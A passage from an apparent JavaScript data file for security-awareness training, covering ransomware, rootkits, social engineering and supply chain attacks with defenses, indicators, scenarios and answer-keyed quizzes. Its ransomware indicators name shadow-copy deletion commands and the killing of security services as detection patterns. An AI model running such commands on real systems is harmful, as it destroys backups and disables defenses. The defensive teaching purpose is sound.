                'Network detection for Cobalt Strike beacons and data exfiltration',
                'SIEM alerts for bulk file access across multiple shares'
            ],
            prevention: [
                'Immutable, air-gapped, and tested backups (3-2-1-1-0 backup rule)',
                'Patch management with priority on internet-facing systems (VPN, RDP, email)',
                'Disable or MFA-protect RDP and other remote access services',
                'Network segmentation to limit lateral movement and blast radius',
                'Email security with attachment sandboxing and link detonation'
            ],
            response: [
                'Isolate infected systems immediately to stop encryption spread',
                'Do NOT pay ransom without exhausting all other options and consulting experts',
                'Preserve encrypted systems for forensic analysis and potential free decryptor availability',
                'Activate incident response plan and engage specialized ransomware response firms',
                'Report to law enforcement (FBI IC3) and CISA — they may have decryption keys or intelligence'
            ]
        },
        indicators: {
            network: [
                'Cobalt Strike or Sliver C2 beacon traffic (periodic HTTPS/DNS check-ins)',
                'Large outbound data transfers to cloud storage services (Mega, RClone destinations)',
                'SMB traffic spreading laterally to multiple file shares simultaneously',
                'RDP brute force attempts from internal compromised hosts to other systems',
                'Tor network connections from internal servers (ransom negotiation portal)'
            ],
            host: [
                'Mass file renames with new extensions (.encrypted, .locked, .conti, .ryuk, etc.)',
                'Shadow copy deletion commands: vssadmin delete shadows, wmic shadowcopy delete',
                'Ransom note files appearing on desktops and in directories (README.txt, DECRYPT-FILES.html)',
                'Group Policy modifications pushing scripts or executables to multiple systems',
                'Backup service and antivirus processes being terminated (taskkill, sc stop)'
            ],
            behavioral: [
                'Canary/honeypot files modified or accessed (early warning before full encryption)',
                'Massive spike in file system write operations across network shares',
                'Users reporting inability to open files that were previously accessible',
                'Multiple endpoint antivirus alerts firing simultaneously across the organization',
                'IT help desk receiving volume of calls about inaccessible files and strange desktop messages'
            ],
            tools: ['Canary files / HoneyDocs', 'Raccine (ransomware kill switch)', 'No More Ransom Project (free decryptors)', 'ID Ransomware (variant identification)', 'Veeam / Commvault (immutable backups)', 'CrowdStrike Falcon / SentinelOne (EDR)', 'CISA Ransomware Guide', 'Cobalt Strike beacon detection (JA3 hashes)']
        },
        interactive: {
            scenario: 'At 2:47 AM on a Saturday, your SIEM fires multiple alerts: (1) vssadmin.exe deleting shadow copies on the file server, (2) a Group Policy being modified to run a .bat script on all domain computers at next logon, (3) Cobalt Strike C2 beacon detected from the domain controller, and (4) 500 GB of data uploaded to a Mega.nz account over the past 6 hours from the domain controller. You are the on-call security analyst. What are your first three actions in order?',
            options: [
                'Wait until Monday morning when the full team is available to assess the situation',
                'Disconnect all affected systems from the network to stop encryption spread, block the C2 IP and Mega.nz at the firewall, then activate the incident response team and begin restoring from immutable backups',
                'Pay the ransom quickly to minimize data loss and downtime',
                'Restart the domain controller and file server to interrupt the malware process'
            ],
            correct: 1,
            explanation: 'This is a ransomware attack in its final stages — the attacker has already exfiltrated 500 GB (double extortion preparation), established C2 on the domain controller, deleted shadow copies (destroying local backups), and staged a Group Policy payload for mass deployment at next logon. Every second counts. (1) Network isolation is the highest priority — prevents the GPO-deployed ransomware from reaching more machines and stops further exfiltration. (2) Block C2 and exfil destinations to cut off the attacker\'s command channel. (3) Activate the IR team to begin forensic analysis and restore from immutable/offline backups. Never restart compromised machines — this may trigger additional payloads or destroy volatile forensic evidence in memory.'
        },
        quiz: [
            { question: 'What is "double extortion" in modern ransomware?', options: ['Demanding ransom twice', 'Encrypting files AND threatening to publish stolen data if ransom is not paid', 'Attacking two organizations simultaneously', 'Using two different encryption algorithms'], correct: 1, explanation: 'Double extortion combines traditional file encryption with data theft. Even if the victim restores from backups, the attacker threatens to publish sensitive stolen data on leak sites.' },
            { question: 'What is Ransomware-as-a-Service (RaaS)?', options: ['A cloud backup service', 'A business model where ransomware developers provide tools to affiliates for a share of ransom payments', 'A ransomware removal service', 'A government program to fight ransomware'], correct: 1, explanation: 'RaaS operates like a franchise — developers create and maintain the ransomware, while affiliates conduct the actual attacks. Profits are split (typically 70/30 or 80/20).' },
            { question: 'Why do ransomware attackers specifically target backup systems?', options: ['Backups contain the most valuable data', 'Destroying backups forces victims to pay because they cannot restore independently', 'Backups are easier to encrypt', 'Backups always contain credentials'], correct: 1, explanation: 'If backups are intact, victims can restore without paying. Ransomware operators specifically seek out and destroy shadow copies, backup catalogs, and backup server volumes before encrypting production data.' },
            { question: 'The WannaCry ransomware spread across networks using which vulnerability?', options: ['Log4Shell', 'EternalBlue (MS17-010) exploiting SMBv1', 'Heartbleed', 'Shellshock'], correct: 1, explanation: 'WannaCry used EternalBlue, an NSA-developed exploit for a vulnerability in Windows SMBv1. Despite a patch being available (MS17-010), many systems remained unpatched, allowing worm-like propagation.' },
            { question: 'What is the 3-2-1-1-0 backup rule?', options: ['A password complexity requirement', '3 copies of data, 2 different media types, 1 offsite, 1 immutable/air-gapped, 0 errors in restoration tests', 'A network segmentation strategy', 'A ransomware negotiation framework'], correct: 1, explanation: 'The 3-2-1-1-0 rule ensures backup resilience: 3 total copies, 2 different media, 1 offsite copy, 1 immutable or air-gapped copy (ransomware-proof), and 0 errors in regular restoration testing.' },
            { question: 'Your organization is hit by ransomware. What should you do FIRST?', options: ['Pay the ransom immediately to minimize downtime', 'Isolate infected systems to prevent further encryption spread', 'Email the attacker to negotiate', 'Restore from backups immediately'], correct: 1, explanation: 'Containment is the first priority. Isolating infected systems (network disconnection) stops the ransomware from encrypting additional systems. Only after containment should you assess scope and begin recovery.' }
        ]
    },

    // =================================================================
    // 13. ROOTKITS
    // =================================================================
    ROOTKITS: {
        code: 'ROOTKITS',
        title: 'Rootkits',
        icon: '\u{1F47B}',
        severity: 'critical',
        color: '#a855f7',
        description: 'Stealthy malware designed to hide deep within the operating system, providing persistent privileged access while remaining undetectable by standard security tools.',
        overview: {
            what: 'A rootkit is a collection of malicious software designed to give an unauthorized user privileged access to a computer while actively concealing its presence. Rootkits operate at various levels of the system — from user-mode (application level) to kernel-mode (OS core) to firmware/bootkit (below the OS). Their defining characteristic is stealth: they modify the operating system itself to hide files, processes, registry keys, and network connections.',
            keyPoints: [
                'User-mode rootkits hook API calls to hide from standard tools',
                'Kernel-mode rootkits modify the OS kernel, making them extremely hard to detect',
                'Bootkits infect the boot process (MBR/VBR/UEFI) and load before the OS',
                'Firmware rootkits persist in hardware firmware, surviving OS reinstallation',
                'Detection often requires booting from trusted external media for offline analysis'
            ],
            examples: [
                { name: 'Sony BMG Rootkit (2005)', detail: 'Sony installed a rootkit on customers\' PCs via music CDs to enforce DRM. It hid itself from the OS, created security vulnerabilities, and couldn\'t be cleanly uninstalled.' },
                { name: 'Stuxnet (2010)', detail: 'Nation-state rootkit/worm targeting Iranian nuclear centrifuges. Included a kernel-mode rootkit with stolen Realtek and JMicron digital certificates for driver signing.' },
                { name: 'LoJax (2018)', detail: 'First in-the-wild UEFI rootkit, attributed to APT28. Modified UEFI firmware to persist across OS reinstallation, hard drive replacement, and standard forensic procedures.' }
            ],
            stats: [
                { label: 'Rootkit detections', value: '35% increase', note: 'year over year (Positive Technologies)' },
                { label: 'Kernel-mode rootkits', value: '38%', note: 'of rootkit malware (Positive Technologies)' },
                { label: 'Avg. persistence', value: 'Years', note: 'firmware rootkits can persist indefinitely' }
            ]
        },
        attackFlow: {
            title: 'Rootkit Deployment Lifecycle',
            steps: [
                { phase: 'Initial Compromise', description: 'Attacker gains access through an exploit, phishing, or physical access. Root/admin privileges are typically required for kernel or bootkit installation.', icon: '\u{1F6AA}' },
                { phase: 'Privilege Escalation', description: 'If initial access is unprivileged, attacker escalates to kernel/SYSTEM level using local exploits or credential theft — required for deep rootkit installation.', icon: '\u{2B06}' },
                { phase: 'Rootkit Installation', description: 'Installs rootkit components: hooks system calls, patches kernel structures, modifies boot records, or writes to firmware depending on rootkit type.', icon: '\u{1F4BE}' },
                { phase: 'Concealment Activation', description: 'Rootkit begins hiding: filters process lists, intercepts file system queries, masks network connections, and may cloak other malware on the system.', icon: '\u{1F47B}' },
                { phase: 'Persistent Access', description: 'Provides ongoing hidden access to the attacker. May include keyloggers, credential harvesters, or backdoor listeners that are invisible to the OS.', icon: '\u{1F511}' },
                { phase: 'Stealth Operations', description: 'Attacker operates with impunity: exfiltrates data, deploys additional malware, or maintains surveillance — all hidden from security tools running on the compromised OS.', icon: '\u{1F575}' }
            ]
        },
        defense: {
            detection: [
                'Boot from trusted external media (live USB) for offline filesystem analysis',
                'Compare system state from inside vs. outside the OS (cross-view detection)',
                'Memory forensics tools (Volatility Framework) to analyze kernel structures',
                'Secure Boot and Measured Boot to detect bootkit and firmware modifications',
                'Behavioral analysis for system anomalies that rootkits cannot fully hide (performance, network)'
            ],
            prevention: [
                'Enable Secure Boot (UEFI) to prevent unsigned bootloader/kernel modifications',
                'Enforce driver signing and enable Kernel Mode Code Integrity (KMCI)',
                'Use Trusted Platform Module (TPM) for hardware-based integrity measurements',
                'Keep firmware updated and enable firmware write protection where available',
                'Principle of least privilege — restrict admin/root access to prevent installation'
            ],
            response: [
                'Do not trust any tools running on the compromised OS — use external analysis',
                'For kernel/boot rootkits: full OS reinstallation from trusted media is required',
                'For firmware rootkits: may require hardware replacement or vendor firmware reflash',
                'Forensic imaging of affected systems before remediation for evidence preservation',
                'Audit all systems on the network for similar rootkit indicators'
            ]
        },
        indicators: {
            network: [
                'Network connections from a host that are visible externally but not shown by local netstat',
                'Packet captures showing traffic from processes that the host OS claims do not exist',
                'Unexplained bandwidth usage that cannot be attributed to any visible process',
                'Communication with known rootkit C2 infrastructure on threat intel feeds',
                'DNS queries or HTTP requests from a system with no visible processes making those calls'
            ],
            host: [
                'Discrepancies between process lists from different tools (e.g., Task Manager vs. raw memory analysis)',
                'Files visible when booting from external media but invisible from within the running OS',
                'System call table modifications detected by kernel integrity checking tools',
                'Secure Boot or Measured Boot validation failures during startup',
                'Unexpected kernel modules loaded (lsmod on Linux, drivers on Windows) with no known origin'
            ],
            behavioral: [
                'Antivirus or EDR tools reporting they are running but producing zero findings despite known threats present',
                'System performance degradation with no visible high-resource processes',
                'Timestamps on system files that do not match known installation or update dates',
                'Security tools crashing or being unable to access certain system APIs',
                'Disk space usage higher than accounted for by visible files'
            ],
            tools: ['Volatility Framework (memory forensics)', 'GMER (rootkit detector)', 'chkrootkit / rkhunter (Linux)', 'Windows Defender Offline', 'Kaspersky TDSSKiller', 'Trusted Boot / Measured Boot with TPM', 'UEFI Secure Boot validation', 'Live USB forensic distributions (CAINE, SIFT)']
        },
        interactive: {
            scenario: 'Your security team suspects a rootkit on a critical server after noticing these anomalies: (1) netstat shows only 3 established connections, but your network TAP captures show 7 active connections from that server\'s IP, (2) the server\'s disk usage shows 94% full but all visible files only account for 71% of capacity, (3) antivirus scans return 100% clean results despite behavioral alerts from the network IDS. Your junior analyst suggests running a more thorough antivirus scan directly on the server. Is this the correct approach?',
            options: [
                'Yes — a deeper antivirus scan with updated signatures will detect the rootkit',
                'No — you cannot trust ANY tools running on a potentially rootkitted system. The rootkit controls what the OS reports. Boot from trusted external media and perform offline forensic analysis',
                'Run Windows Defender in Safe Mode to bypass the rootkit',
                'Use Task Manager to identify and kill the rootkit processes manually'
            ],
            correct: 1,
            explanation: 'This is the fundamental principle of rootkit analysis: a kernel-mode rootkit controls the OS itself, meaning any tool running on that OS sees only what the rootkit allows. The cross-view discrepancies prove this: netstat (running inside the OS) shows 3 connections while the external TAP (which the rootkit cannot manipulate) shows 7. The hidden disk usage and clean antivirus results further confirm the rootkit is actively concealing its presence. The only reliable approach is to boot from trusted external media (live USB) and examine the filesystem, memory, and boot sectors offline where the rootkit is dormant and cannot filter results.'
        },
        quiz: [
            { question: 'What is the primary purpose of a rootkit?', options: ['To encrypt files for ransom', 'To provide persistent privileged access while hiding its presence from the operating system', 'To mine cryptocurrency', 'To spread to other computers'], correct: 1, explanation: 'Rootkits are defined by their stealth — they hide deep in the system to maintain undetectable access. Unlike ransomware, their goal is concealment, not disruption.' },
            { question: 'Why are kernel-mode rootkits harder to detect than user-mode rootkits?', options: ['They use stronger encryption', 'They operate at the OS kernel level and can intercept/modify any system call, including those used by security tools', 'They run on separate hardware', 'They only activate when the computer is idle'], correct: 1, explanation: 'Kernel-mode rootkits run with the highest OS privileges and can intercept any system call. Security tools running in user mode must go through the kernel, where the rootkit can filter what they see.' },
            { question: 'What is a bootkit?', options: ['A rootkit that disables booting', 'A rootkit that infects the boot process (MBR/VBR/UEFI), loading before the operating system', 'A tool for creating bootable USB drives', 'A type of boot encryption'], correct: 1, explanation: 'Bootkits infect the boot process — Master Boot Record, Volume Boot Record, or UEFI firmware — loading their malicious code before the operating system starts, evading OS-level security entirely.' },
            { question: 'Why did the LoJax UEFI rootkit represent a significant threat evolution?', options: ['It was the fastest-spreading rootkit', 'It persisted in firmware, surviving OS reinstallation and even hard drive replacement', 'It only affected Linux systems', 'It was sold as commercial software'], correct: 1, explanation: 'LoJax was the first in-the-wild UEFI rootkit. Because it lived in firmware rather than on the hard drive, it survived OS reinstallation and drive replacement — traditional remediation was ineffective.' },
            { question: 'What is the BEST approach to detect a kernel-mode rootkit on a system?', options: ['Run antivirus from within the infected OS', 'Boot from trusted external media and analyze the filesystem offline', 'Check Task Manager for suspicious processes', 'Look for unusual files on the desktop'], correct: 1, explanation: 'Since kernel rootkits control what the OS shows, you cannot trust any tools running on the compromised system. Booting from trusted external media lets you examine the filesystem without rootkit interference.' }
        ]
    },

    // =================================================================
    // 14. SOCIAL ENGINEERING
    // =================================================================
    SOCIAL_ENGINEERING: {
        code: 'SOCIAL_ENGINEERING',
        title: 'Social Engineering',
        icon: '\u{1F3AD}',
        severity: 'high',
        color: '#a855f7',
        description: 'Psychological manipulation techniques that exploit human trust, fear, urgency, or curiosity to trick people into revealing information or performing actions that compromise security.',
        overview: {
            what: 'Social engineering is the art of manipulating people into giving up confidential information, performing actions, or making security mistakes. Rather than attacking systems directly, social engineers attack the human element — exploiting psychological principles like trust, authority, urgency, and reciprocity. It encompasses phishing, pretexting, baiting, tailgating, quid pro quo, and more.',
            keyPoints: [
                'Exploits human psychology, not technical vulnerabilities',
                'Six principles of influence (Cialdini): reciprocity, commitment, social proof, authority, liking, scarcity',
                'Pretexting: creating a fabricated scenario to engage the victim',
                'Baiting: offering something enticing (free USB, download) to deliver malware',
                'Tailgating/Piggybacking: following authorized person through secured entrance'
            ],
            examples: [
                { name: 'Kevin Mitnick', detail: 'Legendary social engineer who hacked dozens of companies primarily through phone pretexting and impersonation. Stole source code from Motorola, Nokia, and Sun Microsystems.' },
                { name: 'Twitter VIP Hack (2020)', detail: 'Attackers used phone-based social engineering (vishing) targeting Twitter employees to gain internal tool access, ultimately hijacking accounts of Obama, Musk, and Apple.' },
                { name: 'RSA SecurID Breach (2011)', detail: 'Attackers sent spear phishing emails with Excel files exploiting Flash vulnerability to RSA employees. Led to compromise of SecurID token seeds, impacting U.S. defense contractors.' }
            ],
            stats: [
                { label: 'Attacks involving social engineering', value: '98%', note: 'of cyberattacks (KnowBe4)' },
                { label: 'Voice phishing success rate', value: '~77%', note: 'in professional pen tests' },
                { label: 'Avg. cost per attack', value: '$4.76M', note: 'social engineering breach cost (IBM 2024)' }
            ]
        },
        attackFlow: {
            title: 'Social Engineering Attack Lifecycle',
            steps: [
                { phase: 'Target Research', description: 'Attacker gathers information about the target and organization: employee names, roles, relationships, communication styles, vendors, and internal processes from OSINT sources.', icon: '\u{1F50D}' },
                { phase: 'Pretext Development', description: 'Creates a believable scenario and identity: IT support needing password verification, a vendor with an urgent delivery, a new executive requesting information.', icon: '\u{1F3AD}' },
                { phase: 'Trust Building', description: 'Establishes rapport and credibility using insider knowledge, name-dropping colleagues, displaying authority symbols, or leveraging prior interactions.', icon: '\u{1F91D}' },
                { phase: 'Exploitation', description: 'Triggers the desired action: victim reveals credentials, opens a door, installs software, transfers money, or provides sensitive information.', icon: '\u{26A1}' },
                { phase: 'Execution', description: 'Attacker uses the obtained access, information, or action to achieve their objective: network access, data theft, financial fraud, or physical entry.', icon: '\u{1F3AF}' },
                { phase: 'Exit & Cover', description: 'Ends the interaction naturally without raising suspicion. Victim may not realize they were manipulated for hours, days, or ever.', icon: '\u{1F6B6}' }
            ]
        },
        defense: {
            detection: [
                'Security awareness training with regular simulated social engineering tests',
                'Encourage a culture where employees verify unusual requests without feeling embarrassed',
                'Monitor for pretexting indicators: urgency, authority claims, requests to bypass procedures',
                'Physical security monitoring: badge-less entries, tailgating at access points',
                'Track and investigate reported suspicious contacts (calls, emails, visitors)'
            ],
            prevention: [
                'Regular security awareness training covering all social engineering techniques',
                'Strict verification procedures for sensitive requests (callback verification, dual approval)',
                'Physical access controls: mantraps, badge readers, visitor management',
                'Clear policies on information sharing — what can and cannot be disclosed',
                'Empower employees to say "no" and verify without fear of repercussions'
            ],
            response: [
                'If an attack is recognized mid-interaction: stop, do not provide further information',
                'Report the incident to security team with all available details',
                'If credentials were shared: immediate password reset and session termination',
                'If physical access was gained: security sweep of affected areas',
                'Conduct post-incident lessons learned to improve training and procedures'
            ]
        },
        indicators: {
            network: [
                'Emails failing DMARC/SPF/DKIM authentication from domains mimicking partners or executives',
                'Newly registered lookalike domains appearing in DNS queries (typosquatting)',
                'Phishing URLs sent via corporate messaging platforms (Slack, Teams, SMS)',
                'Outbound connections to credential harvesting pages mimicking corporate login portals',
                'USB devices being plugged into workstations that were found in public areas (baiting)'
            ],
            host: [
                'Execution of files from USB drives found in parking lots or common areas',
                'Browser history showing visits to lookalike credential harvesting domains',
                'Unauthorized remote access tools installed after a phone-based social engineering call',
                'Calendar invites with malicious links sent to appear as internal meetings',
                'New browser extensions installed after social engineering-initiated tech support calls'
            ],
            behavioral: [
                'Employee receiving calls from someone claiming to be IT support requesting credentials',
                'Unusual requests that bypass standard operating procedures citing executive authority',
                'Visitors without badges following employees through secure doors (tailgating)',
                'Employees receiving USB drives, gift cards, or physical items from unknown senders',
                'Pressure tactics in communications: extreme urgency, threats of consequences, appeals to help'
            ],
            tools: ['Gophish (phishing simulation)', 'SET (Social Engineering Toolkit)', 'KnowBe4 / Cofense (awareness training)', 'OSINT Framework (recon assessment)', 'Physical penetration testing', 'Pretexting scenario libraries', 'Badge/access log analysis', 'Security awareness metrics dashboards']
        },
        interactive: {
            scenario: 'Your receptionist receives a phone call from someone claiming to be from your company\'s IT department. The caller knows the name of your actual CTO and references a real ongoing server migration project (publicly mentioned in a company blog post). They say: "We\'re migrating email servers tonight and need to verify employee credentials before the cutover. Can you provide your username and password so we can test your account migration? If we don\'t verify by 5 PM, your email will be offline for 3 business days." What social engineering principles are being exploited, and what should the receptionist do?',
            options: [
                'The caller seems legitimate because they know internal details — provide the credentials to avoid email disruption',
                'Ask the caller to email the request so you have it in writing, then provide the credentials via email reply',
                'Recognize this as pretexting using authority (CTO name), social proof (real project), and scarcity/urgency (5 PM deadline, 3-day outage). Refuse to provide credentials, hang up, call the IT department at their known number to verify, and report the incident',
                'Provide only the username but not the password as a compromise'
            ],
            correct: 2,
            explanation: 'This attack layers multiple Cialdini principles: Authority (referencing the CTO), Social Proof (citing a real project to build credibility), Scarcity/Urgency (5 PM deadline, 3-day consequence). The attacker gathered the CTO name and migration project from OSINT (the company blog). Legitimate IT departments NEVER ask for passwords over the phone. The correct response: refuse, end the conversation, independently verify by calling IT at their known number (not a number the caller provides), and report the incident. Never provide credentials through any unverified channel, regardless of how legitimate the caller seems.'
        },
        quiz: [
            { question: 'Which of Cialdini\'s six principles of influence does an attacker use when impersonating a CEO?', options: ['Reciprocity', 'Authority', 'Social proof', 'Scarcity'], correct: 1, explanation: 'The authority principle states that people tend to comply with requests from perceived authority figures. Impersonating a CEO or other executive leverages this psychological tendency.' },
            { question: 'What is pretexting in social engineering?', options: ['Sending fake emails', 'Creating a fabricated scenario to establish trust and manipulate the victim', 'Physically following someone through a door', 'Leaving infected USB drives in a parking lot'], correct: 1, explanation: 'Pretexting involves constructing a convincing backstory and identity (e.g., "I\'m from IT support and need to verify your account") to build trust and extract information.' },
            { question: 'An employee finds a USB drive labeled "Q4 Salary Data" in the parking lot and plugs it into their work computer. What social engineering technique is this?', options: ['Phishing', 'Pretexting', 'Baiting', 'Tailgating'], correct: 2, explanation: 'Baiting exploits curiosity or greed by leaving an enticing item (like a USB drive with an intriguing label) for the victim to find and use, delivering malware when connected.' },
            { question: 'Someone in a delivery uniform asks an employee to hold the secure door open. What attack is this?', options: ['Shoulder surfing', 'Baiting', 'Pretexting', 'Tailgating/Piggybacking'], correct: 3, explanation: 'Tailgating (or piggybacking) is physically following an authorized person through a secured entrance. The uniform provides social proof and authority, making the employee reluctant to refuse.' },
            { question: 'Why is social engineering often the MOST effective attack vector?', options: ['Because technology cannot defend against it', 'Because humans are psychologically wired to trust and comply, and no technical control can fully prevent poor human decisions', 'Because security tools are all ineffective', 'Because social engineering is legal'], correct: 1, explanation: 'Social engineering exploits fundamental human psychology — our tendency to trust, help, comply with authority, and respond to urgency. These are deeply ingrained traits that no firewall can patch.' },
            { question: 'What is the BEST organizational defense against social engineering?', options: ['Buying more security software', 'Regular, realistic security awareness training combined with a culture of verification', 'Firing employees who fall for social engineering', 'Banning all phone calls and emails'], correct: 1, explanation: 'Ongoing training (especially with simulated attacks) combined with a culture where verification is encouraged and never punished is the most effective defense against social engineering.' }
        ]
    },

    // =================================================================
    // 15. SUPPLY CHAIN ATTACKS
    // =================================================================
    SUPPLY_CHAIN: {
        code: 'SUPPLY_CHAIN',
        title: 'Supply Chain Attacks',
        icon: '\u{1F517}',
        severity: 'critical',
        color: '#a855f7',
        description: 'Attacks that compromise a trusted supplier, vendor, or software update mechanism to infiltrate downstream targets through their existing trust relationships.',
        overview: {
            what: 'A supply chain attack targets the less-secure elements of an organization\'s supply chain — software vendors, managed service providers, hardware manufacturers, or open-source dependencies. By compromising a trusted supplier, attackers can distribute malicious code to thousands of organizations through legitimate update channels. These attacks exploit the inherent trust between organizations and their suppliers.',
            keyPoints: [
                'Compromises a trusted vendor to reach many downstream targets simultaneously',
                'Software supply chain: malicious updates, backdoored libraries, compromised build systems',
                'Hardware supply chain: tampered firmware, pre-installed malware, counterfeit components',
                'Open-source supply chain: typosquatting packages, maintainer account takeover, dependency confusion',
                'Extremely high impact — one compromise can affect thousands of organizations'
            ],
            examples: [
                { name: 'SolarWinds/SUNBURST (2020)', detail: 'Russian APT29 compromised SolarWinds\' build system, inserting a backdoor into the Orion software update. 18,000 organizations installed the trojanized update, including U.S. Treasury, DHS, and Fortune 500 companies.' },
                { name: 'Kaseya VSA (2021)', detail: 'REvil ransomware gang exploited a zero-day in Kaseya VSA (used by MSPs), deploying ransomware to 1,500+ downstream businesses through trusted MSP management channels.' },
                { name: 'XZ Utils Backdoor (2024)', detail: 'A multi-year social engineering campaign to become a trusted maintainer of the xz compression library, then insert a backdoor targeting SSH authentication in Linux distributions.' }
            ],
            stats: [
                { label: 'Supply chain attacks', value: '+742%', note: 'increase since 2019 (Sonatype)' },
                { label: 'Open source dependencies', value: '90%+', note: 'of modern software uses them' },
                { label: 'SolarWinds impact', value: '18,000+', note: 'organizations affected' }
            ]
        },
        attackFlow: {
            title: 'Supply Chain Attack Lifecycle',
            steps: [
                { phase: 'Supply Chain Mapping', description: 'Attacker identifies the target\'s vendors, software dependencies, MSPs, and update mechanisms. Maps trust relationships and finds the weakest link.', icon: '\u{1F5FA}' },
                { phase: 'Supplier Compromise', description: 'Compromises the supplier through direct attack, social engineering of maintainers, or infiltrating the build/CI pipeline. Goal: access to software distribution.', icon: '\u{1F510}' },
                { phase: 'Payload Insertion', description: 'Inserts malicious code into the supplier\'s product: backdoor in source code, trojanized update package, or compromised dependency. Code passes code review through sophistication or social trust.', icon: '\u{1F489}' },
                { phase: 'Distribution', description: 'Malicious code is distributed through legitimate channels: signed software updates, package managers, or MSP management tools. Victims have no reason to distrust it.', icon: '\u{1F4E6}' },
                { phase: 'Activation', description: 'Backdoor activates in victim environments, often with delays or conditions to avoid detection. May check the target before activating (SolarWinds checked for security tools first).', icon: '\u{26A1}' },
                { phase: 'Exploitation', description: 'Attacker uses the trusted access to conduct espionage, deploy ransomware, steal data, or establish persistent access across thousands of compromised organizations.', icon: '\u{1F3AF}' }
            ]
        },
        defense: {
            detection: [
                'Software Bill of Materials (SBOM) tracking for all software dependencies',
                'Binary analysis and reproducible builds to verify software integrity',
                'Network monitoring for unexpected outbound connections from trusted software',
                'Behavioral analysis of software updates — unusual post-update activity',
                'Supply chain threat intelligence feeds and vendor security assessments'
            ],
            prevention: [
                'Vendor security assessments and contractual security requirements',
                'Code signing verification for all software and updates',
                'Dependency pinning and hash verification for open-source packages',
                'Zero Trust architecture — don\'t trust software just because the vendor is trusted',
                'Isolated build environments and CI/CD pipeline security hardening'
            ],
            response: [
                'Immediately quarantine the compromised software/update from all systems',
                'Identify all systems running the affected version and scope the compromise',
                'Coordinate with the vendor for verified clean versions and incident details',
                'Hunt for indicators of compromise (IOCs) specific to the supply chain attack',
                'Review and strengthen vendor management and software supply chain processes'
            ]
        },
        indicators: {
            network: [
                'Trusted software making unexpected outbound connections to unknown domains after an update',
                'C2-like traffic patterns from processes that are part of legitimate, signed vendor software',
                'DNS queries to DGA-like domains originating from vendor management tools',
                'Data exfiltration from systems that only runs after a specific software version is installed',
                'Anomalous traffic from build servers or CI/CD pipeline components'
            ],
            host: [
                'Software update hashes not matching vendor-published checksums',
                'Legitimate signed binaries exhibiting behaviors not consistent with their documentation',
                'New or modified files appearing in vendor software directories after updates',
                'Unexpected child processes spawned by vendor applications (e.g., Orion spawning cmd.exe)',
                'Changes to package-lock.json or dependency files introducing unknown libraries'
            ],
            behavioral: [
                'Vendor software suddenly requiring new permissions or network access after an update',
                'Open-source package maintainer accounts changing ownership or committer patterns',
                'Build pipeline producing different outputs from the same source code (compromised build system)',
                'Vendor delaying or being evasive about security incident reports',
                'Third-party audit findings showing discrepancies between vendor code repository and distributed binaries'
            ],
            tools: ['Sigstore (software signing)', 'in-toto (supply chain integrity)', 'SBOM generators (Syft, CycloneDX)', 'Dependency-Track', 'Snyk / Socket.dev (dependency scanning)', 'Reproducible builds verification', 'Binary analysis (BinDiff, Ghidra)', 'npm audit / pip-audit / cargo audit']
        },
        interactive: {
            scenario: 'Your dependency scanning tool flags that a popular npm package (left-pad-utils) your application depends on was updated 2 hours ago. The update was pushed by a new maintainer who was added to the project just last week. The commit changes are minimal in the main code but add a new postinstall script that downloads and executes a binary from a Cloudflare Workers URL. The package has 2.3 million weekly downloads. Your CI/CD pipeline already pulled this version for tonight\'s build. What is happening and what should you do?',
            options: [
                'The new maintainer is making performance improvements — this is normal open-source development',
                'This is likely a supply chain attack via maintainer account takeover or social engineering. Immediately pin the previous version, block the malicious URL, audit your build artifacts for compromise, report to npm security, and scan all systems where the package was installed',
                'Wait for the community to investigate — someone will report it if it is malicious',
                'Remove the dependency entirely and find an alternative package'
            ],
            correct: 1,
            explanation: 'This matches the exact pattern of the XZ Utils attack and numerous npm supply chain compromises: a new maintainer gains trust, then inserts a postinstall script that downloads a remote payload. Red flags: (1) new maintainer added very recently, (2) postinstall script added (code execution during npm install), (3) downloads external binary (classic dropper behavior), (4) uses Cloudflare Workers (common for evasion). Your CI/CD already pulled this version, so you must audit tonight\'s build artifacts to determine if the payload executed. Pin to the previous safe version, block the URL at your proxy/firewall, report to npm security (they can unpublish the malicious version), and scan all environments.'
        },
        quiz: [
            { question: 'What made the SolarWinds attack so devastating?', options: ['SolarWinds had weak passwords', 'The backdoor was distributed through a legitimate, signed software update trusted by 18,000+ organizations', 'SolarWinds was a small company', 'The attack only affected one organization'], correct: 1, explanation: 'SolarWinds Orion was trusted monitoring software. The attackers compromised the build system, inserting a backdoor that was signed and distributed as a legitimate update, bypassing all traditional security controls.' },
            { question: 'What is a Software Bill of Materials (SBOM)?', options: ['A list of software licenses purchased', 'A comprehensive inventory of all components, libraries, and dependencies in a software product', 'A bill from the software vendor', 'A document listing software bugs'], correct: 1, explanation: 'An SBOM lists every component in a software product — including open-source libraries and their versions. It enables organizations to quickly identify if they\'re affected when a dependency is found vulnerable.' },
            { question: 'The XZ Utils backdoor attempt (2024) used what primary technique?', options: ['Exploiting a zero-day vulnerability', 'A multi-year social engineering campaign to become a trusted maintainer, then inserting a backdoor', 'Brute forcing the repository password', 'DNS hijacking'], correct: 1, explanation: 'The attacker spent years building trust within the open-source community, becoming a co-maintainer of the xz compression library, then subtly inserted a sophisticated backdoor targeting SSH authentication.' },
            { question: 'Why is "dependency confusion" a supply chain attack risk?', options: ['Dependencies slow down software', 'Attackers can publish malicious packages with the same name as private internal packages in public repositories', 'Dependencies always contain vulnerabilities', 'It only affects Python packages'], correct: 1, explanation: 'Dependency confusion exploits how package managers resolve names. If an attacker publishes a higher-version package with the same name as a private internal package, the build system may pull the malicious public version.' },
            { question: 'How did the Kaseya VSA attack demonstrate supply chain risk for Managed Service Providers (MSPs)?', options: ['MSPs have weak security', 'Compromising one MSP tool allowed ransomware deployment to 1,500+ downstream client businesses', 'MSPs don\'t use encryption', 'The attack only affected Kaseya'], correct: 1, explanation: 'MSPs use tools like Kaseya VSA to manage many clients simultaneously. Compromising this tool gave the attacker a distribution channel to push ransomware to all the MSP\'s clients at once — massive blast radius.' },
            { question: 'Which practice BEST protects against software supply chain attacks?', options: ['Only using commercial (non-open-source) software', 'Verifying code signatures, pinning dependencies, and monitoring software behavior post-update', 'Never updating software', 'Using only software developed in-house'], correct: 1, explanation: 'A defense-in-depth approach: verify signatures to ensure integrity, pin dependencies to prevent substitution, and monitor behavior to detect anomalies even in trusted, signed software.' }
        ]
    },

    // =================================================================
    // 16. ZERO-DAY EXPLOITS
    // =================================================================
    ZERO_DAY: {
        code: 'ZERO_DAY',
        title: 'Zero-Day Exploits',
        icon: '\u{1F4A3}',
        severity: 'critical',
        color: '#a855f7',
